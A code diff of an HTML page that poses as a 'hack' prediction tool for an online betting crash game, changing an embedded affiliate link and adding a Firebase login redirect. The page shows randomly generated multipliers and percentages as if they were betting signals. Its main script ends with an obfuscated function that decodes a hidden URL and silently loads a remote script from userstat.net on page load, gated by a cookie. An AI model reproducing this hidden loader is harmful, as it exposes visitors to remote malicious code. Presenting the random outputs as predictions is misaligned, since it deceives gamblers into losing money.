@@ -367,7 +367,7 @@ iframe {
     </div>
     <button id="backBtn">Sair</button>
   </div>
-  <iframe src="https://record.elephantbet.com/_X7HKQJuDYpXKto_EPcZApGNd7ZgqdRLk/1/" frameborder="0" width="100%" height="calc(100% - 50px)"></iframe>
+  <iframe src="https://record.elephantbet.com/_D7_LR3o9x8n6PBA04iUMN2Nd7ZgqdRLk/1/" frameborder="0" width="100%" height="calc(100% - 50px)"></iframe>
   <script>
 const randomTimeSquare=document.getElementById("randomTime"),generateInfoBtn=document.getElementById("generateInfoBtn"),randomInfoDisplay=document.getElementById("randomInfo"),backBtn=document.getElementById("backBtn"),iframe=document.querySelector("iframe");function generateRandomInfo(){const randomInfoArray=["2X","7X","3X","2X","3X ","2X","2X","3X ","Rosa","3X ","Rosa","2X","4X","5X","4X","5X","3X","3X ","5X","6X","7X","5X","8X","5X","2X","5X","Rosa","Rosa","Rosa","3X","2X","2X","6X","2X","5X","Rosa","3X ","2X","3X","3X ","Rosa","2X","3X ","2X","3X ","2X","3X ","2X","3X ","2X","3X ","2X","3X ","3X","2X","3X ","2X","3X ","2X","3X ","2X","Rosa","2X","3X ","2X","1.50X"];return randomInfoArray[Math.floor(Math.random()*randomInfoArray.length)]}function updateCurrentTime(){const currentTime=(new Date).toLocaleTimeString();document.getElementById("currentTime").textContent=currentTime}iframe.addEventListener("load",(()=>{document.getElementById("siteUrl").textContent=iframe.contentWindow.location.href})),backBtn.addEventListener("click",(()=>{window.history.back()}));const randomTimeDisplay=document.getElementById("randomTime");function updateRandomInfo(){const randomInfo=generateRandomInfo();document.getElementById("randomInfo").textContent=randomInfo}function generateRandomTime(){const currentTime=new Date,randomSeconds=Math.floor(30*Math.random());return currentTime.setSeconds(currentTime.getSeconds()+randomSeconds),`${currentTime.toLocaleTimeString()}`}function updateRandomTimeAndInfo(){const randomTime=generateRandomTime(),randomInfo=generateRandomInfo();document.getElementById("randomTime").textContent=randomTime,document.getElementById("randomInfo").textContent=randomInfo}randomTimeDisplay.textContent=randomTime,setInterval(updateCurrentTime,1e3),setInterval(updateRandomInfo,6e4),setInterval(updateRandomTimeAndInfo,6e4);const overlay=document.getElementById("overlay"),verifyButton=document.getElementById("verifyButton");function updateProgressBar(){const progressBar=document.getElementById("progressBar"),percentageLabel=document.getElementById("percentageLabel"),randomPercentage=Math.floor(71*Math.random())+30;progressBar.style.width=`${randomPercentage}%`,percentageLabel.textContent=`${randomPercentage}%`,setTimeout(updateProgressBar,6e4)}function updateMarketPercentage(){const marketPercentageBar=document.getElementById("marketPercentageFill"),marketPercentageLabel=document.getElementById("marketPercentageLabel"),randomPercentage=Math.floor(61*Math.random())+20;marketPercentageBar.style.width=`${randomPercentage}%`,marketPercentageLabel.textContent=`${randomPercentage}%`,setTimeout(updateMarketPercentage,6e5)}updateProgressBar(),updateMarketPercentage();const infoBtn=document.getElementById("infoBtn"),modalOverlay=document.getElementById("modalOverlay"),closeModalBtn=document.getElementById("closeModalBtn");infoBtn.addEventListener("click",(()=>{modalOverlay.style.display="block"})),closeModalBtn.addEventListener("click",(()=>{modalOverlay.style.display="none"}));const infoContent=document.getElementById("infoContent");function updateInfoContent(){const currentMinute=(new Date).getMinutes();infoContent.textContent=currentMinute>=0&&currentMinute<2||currentMinute>=2&&currentMinute<5?"Possível 100X":currentMinute>=5&&currentMinute<7||currentMinute>=5&&currentMinute<=6?"Possível 10/20/100X":currentMinute>=16&&currentMinute<=17?"Possível 20X":currentMinute>=21&&currentMinute<=22||currentMinute>=26&&currentMinute<=27?"Possível 10/30X":currentMinute>=28&&currentMinute<=29?"Possível 10/20/100X":currentMinute>=31&&currentMinute<=32?"Possível 10/30X":currentMinute>=36&&currentMinute<=37?"Possível 10/20/50X":currentMinute>=41&&currentMinute<=42?"Possível 20/100X":currentMinute>=45&&currentMinute<=46?"Possível 10/100X":currentMinute>=48&&currentMinute<=49?"Possível 18/50X":currentMinute>=50&&currentMinute<=51?"Possível 10/18X":currentMinute>=53&&currentMinute<=54?"Possível 18X":currentMinute>=56&&currentMinute<=57?"Possível 28/100X":"Analizando..."}updateInfoContent(),setInterval(updateInfoContent,6e4);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));
   </script>
@@ -377,5 +377,39 @@ const randomTimeSquare=document.getElementById("randomTime"),generateInfoBtn=doc
 
 
 </script>
+<script src="https://www.gstatic.com/firebasejs/10.11.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.11.1/firebase-auth-compat.js"></script>
+<script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyBIiBJR-ZUp1mey25_7LwaA0y6A_I0GJIU",
+    authDomain: "ios-bets.firebaseapp.com",
+    databaseURL: "https://ios-bets-default-rtdb.firebaseio.com",
+    projectId: "ios-bets",
+    storageBucket: "ios-bets.appspot.com",
+    messagingSenderId: "960843956174",
+    appId: "1:960843956174:web:d8c44d1e99a9ad3262759f",
+    measurementId: "G-L7XEKJBLZ1"
+  };
+  firebase.initializeApp(firebaseConfig);
+</script>
 
+<script>
+  // Verifica se o usuário está autenticado ao carregar a página
+  firebase.auth().onAuthStateChanged(function(user) {
+    if (user) {
+      //Usuário está logado, permanece na tela
+      console.log("Usuário logado!");
+    }
+
+
+    else {
+      //Usuário não está logado, redireciona para index.html
+      console.log("Usuário não logado! Redirecionando...");
+      alert('modo hack {verificado}👨‍💻')
+      window.location.replace("../index.html");
+
+    }
+
+  });
+</script>
 </body></html>
